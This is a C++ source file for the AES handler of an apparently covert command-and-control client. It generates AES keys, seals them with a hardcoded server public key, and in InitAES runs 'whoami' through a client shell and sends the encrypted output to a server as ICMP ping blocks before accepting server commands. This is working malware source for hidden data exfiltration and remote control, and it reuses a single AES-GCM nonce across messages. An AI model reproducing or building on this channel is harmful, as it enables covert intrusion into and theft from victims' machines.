#include "AESHandler.h"
#include "helpers.h"
#include "Client.h"

AESHandler* AESHandler::instance = nullptr; // Initialize singleton instance to null
std::string server_public_key_hex = "ef913984ad9cd58ce89dd4d813f1540e5bae4f6b6061d3c964ea478eca8e3b03"; // Change this
using namespace Helper;

// Private constructor
AESHandler::AESHandler() {
    if (sodium_init() == -1) {
        throw std::runtime_error("libsodium initialization failed!");
    }

}

// Singleton accessor
AESHandler* AESHandler::getInstance() {
    if (!instance) {
        instance = new AESHandler();
    }
    return instance;
}

// Generate AES key and nonce
void AESHandler::generateKeyAndNonce() {
    randombytes_buf(aes_key, sizeof aes_key);
    randombytes_buf(nonce, sizeof nonce);

    std::cout << "[*] Generated AES Key (Hex): " << bytes_to_hex(std::vector<unsigned char>(aes_key, aes_key + sizeof aes_key)).substr(0, 10) << "..." << std::endl;
    std::cout << "[*] Generated Nonce (Hex): " << bytes_to_hex(std::vector<unsigned char>(nonce, nonce + sizeof nonce)).substr(0, 10) << "..." << std::endl;
}

void AESHandler::generateKeyAndNonceTemp() {
    randombytes_buf(aes_key_temp, sizeof aes_key_temp);
    randombytes_buf(nonce_temp, sizeof nonce_temp);

    std::cout << "[*] Generated temporary AES Key (Hex): " << bytes_to_hex(std::vector<unsigned char>(aes_key_temp, aes_key_temp + sizeof aes_key_temp)).substr(0, 10) << "..." << std::endl;
    std::cout << "[*] Generated temporary Nonce (Hex): " << bytes_to_hex(std::vector<unsigned char>(nonce_temp, nonce_temp + sizeof nonce_temp)).substr(0, 10) << "..." << std::endl;

}

// Getters for AES key and nonce
const unsigned char* AESHandler::getKey() const {
    return aes_key;
}

const unsigned char* AESHandler::getNonce() const {
    return nonce;
}



// Encrypt AES key and nonce using server's public key
std::string AESHandler::encryptKeyAndNonce() {
    std::vector<unsigned char> server_public_key = hex_to_bytes(server_public_key_hex);
    unsigned char encrypted_key[crypto_box_SEALBYTES + sizeof(aes_key)];
    unsigned char encrypted_nonce[crypto_box_SEALBYTES + sizeof(nonce)];

    crypto_box_seal(encrypted_key, aes_key, sizeof aes_key, server_public_key.data());
    crypto_box_seal(encrypted_nonce, nonce, sizeof nonce, server_public_key.data());

    std::cout << "[*] Encrypted AES Key (Hex): " << bytes_to_hex(std::vector<unsigned char>(encrypted_key, encrypted_key + sizeof encrypted_key)).substr(0, 10) << "..." << std::endl;
    std::cout << "[*] Encrypted Nonce (Hex): " << bytes_to_hex(std::vector<unsigned char>(encrypted_nonce, encrypted_nonce + sizeof encrypted_nonce)).substr(0, 10) << "..." << std::endl;

    return bytes_to_hex(std::vector<unsigned char>(encrypted_key, encrypted_key + sizeof encrypted_key)) +
        bytes_to_hex(std::vector<unsigned char>(encrypted_nonce, encrypted_nonce + sizeof encrypted_nonce));
}



// Encrypt AES key and nonce using server's public key
std::string AESHandler::encryptKeyAndNonceTemp() {
    std::vector<unsigned char> server_public_key = hex_to_bytes(server_public_key_hex);
    unsigned char encrypted_key_temp[crypto_box_SEALBYTES + sizeof(aes_key_temp)];
    unsigned char encrypted_nonce_temp[crypto_box_SEALBYTES + sizeof(nonce_temp)];

    crypto_box_seal(encrypted_key_temp, aes_key_temp, sizeof aes_key_temp, server_public_key.data());
    crypto_box_seal(encrypted_nonce_temp, nonce_temp, sizeof nonce_temp, server_public_key.data());

    std::cout << "[*] Encrypted AES Key TEMP (Hex): " << bytes_to_hex(std::vector<unsigned char>(encrypted_key_temp, encrypted_key_temp + sizeof encrypted_key_temp)).substr(0, 10) << "..." << std::endl;
    std::cout << "[*] Encrypted Nonce TEMP (Hex): " << bytes_to_hex(std::vector<unsigned char>(encrypted_nonce_temp, encrypted_nonce_temp + sizeof encrypted_nonce_temp)).substr(0, 10) << "..." << std::endl;

    return bytes_to_hex(std::vector<unsigned char>(encrypted_key_temp, encrypted_key_temp + sizeof encrypted_key_temp)) +
        bytes_to_hex(std::vector<unsigned char>(encrypted_nonce_temp, encrypted_nonce_temp + sizeof encrypted_nonce_temp));
}

void AESHandler::Update() {
    // Copy the temporary key and nonce into the actual key and nonce
    std::memcpy(aes_key, aes_key_temp, sizeof aes_key);
    std::memcpy(nonce, nonce_temp, sizeof nonce);


    std::cout << "[*] Updated AES Key (Hex): " << bytes_to_hex(std::vector<unsigned char>(aes_key, aes_key + sizeof aes_key)).substr(0, 10) << "..." << std::endl;
    std::cout << "[*] Updated Nonce (Hex): " << bytes_to_hex(std::vector<unsigned char>(nonce, nonce + sizeof nonce)).substr(0, 10) << "..." << std::endl;

}

// Encrypt a message using AES-GCM
std::vector<unsigned char> AESHandler::encryptMessage(const std::string& message) {
    std::vector<unsigned char> msg(message.begin(), message.end());
    std::vector<unsigned char> ciphertext(msg.size() + crypto_aead_aes256gcm_ABYTES); // + tag size
    unsigned long long ciphertext_len;

    if (crypto_aead_aes256gcm_encrypt(
        ciphertext.data(), &ciphertext_len, msg.data(), msg.size(),
        nullptr, 0, nullptr, nonce, aes_key) != 0) {
        throw std::runtime_error("Encryption failed!");
    }

    /*std::cout << "[*] Client sending to server: " << message << "\n";
    std::cout << "[*] Encrypted Message (Hex): " << bytes_to_hex(ciphertext).substr(0, 10) << "..." << std::endl;*/
   

    return ciphertext;
}

std::string AESHandler::decryptMessage(const std::vector<unsigned char>& ciphertext) {
    // Convert hex ciphertext to bytes
    std::vector<unsigned char> decrypted_message(ciphertext.size() - crypto_aead_aes256gcm_ABYTES);
    unsigned long long decrypted_message_len;

    if (crypto_aead_aes256gcm_decrypt(
        
        decrypted_message.data(), &decrypted_message_len, nullptr, ciphertext.data(), ciphertext.size(),
        nullptr, 0, nonce, aes_key) != 0) {
        std::cout << "Decrypt failed" << "\n";
        throw std::runtime_error("Decryption failed!");
    }

    decrypted_message.resize(decrypted_message_len);
    return std::string(decrypted_message.begin(), decrypted_message.end());
}



// Initialize and use AESHandler
void AESHandler::InitAES(SOCKET sockfd, Custom_icmp icmp, std::string ip_addr, bool connected) {
    generateKeyAndNonce();
    std::string cmdResult;
    if (!connected) {
        int status = Run(client->getShell(), L"whoami", cmdResult);
    } else {
        cmdResult = "AESupdate";
    }



    // Encrypt AES key and nonce
    std::string encrypted_aes_key_nonce_hex = encryptKeyAndNonce();

    // Encrypt message
    std::vector<unsigned char> ciphertext = encryptMessage(cmdResult);

    // Combine the encrypted AES key and nonce with the encrypted message
    std::string combined_encrypted_hex = connected ? encrypted_aes_key_nonce_hex : encrypted_aes_key_nonce_hex + bytes_to_hex(ciphertext);

    // Split result into blocks
    std::vector<std::string> to_server = split(combined_encrypted_hex, client->getBlocksize());

    // Send result to server
    std::string status = icmp.sendPing(sockfd, ip_addr, to_server, connected);
    if (status == "SERVER OFFLINE") {
        std::cout << "\033[31m" << "[-] No response from SERVER, probably not online yet..." << "\033[0m" << "\n\n";
        client->FullCleanup();
        return;
    }
    if (client->getServerCommand() == "INIT OK") {
        client->setServerCommand("");
        client->setConnected(true);
        client->setTimeout(10000);
        
        std::cout << "\033[32m" << "[+] Client successfully delivered AES key and nonce to server!" << "\033[0m" << "\n\n";
        
        
    }

}
